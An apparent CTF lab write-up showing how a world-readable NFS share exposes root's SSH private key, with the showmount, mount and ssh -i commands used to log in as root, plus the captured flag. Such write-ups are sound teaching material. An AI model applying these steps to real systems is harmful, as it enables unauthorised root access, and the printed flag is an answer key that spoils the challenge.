---
title: NFS Privilege Escalation - CTF Writeup (no-files-shared)
date: 2026-07-29 12:30:00 +0000
categories: [Walkthroughs, Linux Escalation]
tags: [linux, privilege-escalation, nfs, ssh, Linux Escalation, pt-garage]
---

# NFS Privilege Escalation — CTF Writeup

During the reconnaissance phase, an Nmap scan was performed against the target system.

## 1. Port Scanning
The scan revealed multiple open ports:
- **22/tcp** → SSH
- **25/tcp** → SMTP
- **111/tcp** → RPCBind
- **2049/tcp** → NFS (Network File System)

The presence of RPCBind (111) and NFS (2049) indicates that the target is running an NFS service, which could allow remote file sharing.

## 2. NFS Share Enumeration
To identify accessible NFS shares, the following command was used:

```bash
showmount -e 13.206.97.201
# Export list for 13.206.97.201:
# /var/share *
```

This shows that the `/var/share` directory is exported and accessible to **all hosts (*)**, which is a misconfiguration and a potential security risk.

## 3. Mounting the NFS Share
Since the share is publicly accessible, it was mounted locally:

```bash
sudo mount -t nfs 13.206.97.201:/var/share /mnt
ls /mnt
# package.tar.gz
```

## 4. Analyzing the Retrieved Archive
After mounting the NFS share, the file `package.tar.gz` was downloaded and extracted. The archive contained the `/root/.ssh/` directory which included the root user's SSH keys:
- `authorized_keys`
- `id_ecdsa` (Private Key)
- `id_ecdsa.pub` (Public Key)

## 5. Gaining SSH Access
First, proper permissions were set on the private key:

```bash
chmod 600 id_ecdsa
```

Then, SSH access was attempted using the key:

```bash
ssh -i id_ecdsa root@13.206.97.201
```

Access was granted as `root`. We then retrieved the flag:

```bash
cat /root/flag.txt
# ctf{ahr2uipeaz8veiDez7ei0oe5ea7aem7A}
```

---



## Walkthrough Screenshots

![Screenshot](/assets/ptgarage/no_files_shared/img_1_1.png)

![Screenshot](/assets/ptgarage/no_files_shared/img_1_2.png)

![Screenshot](/assets/ptgarage/no_files_shared/img_2_1.png)

![Screenshot](/assets/ptgarage/no_files_shared/img_3_1.png)

![Screenshot](/assets/ptgarage/no_files_shared/img_4_1.png)

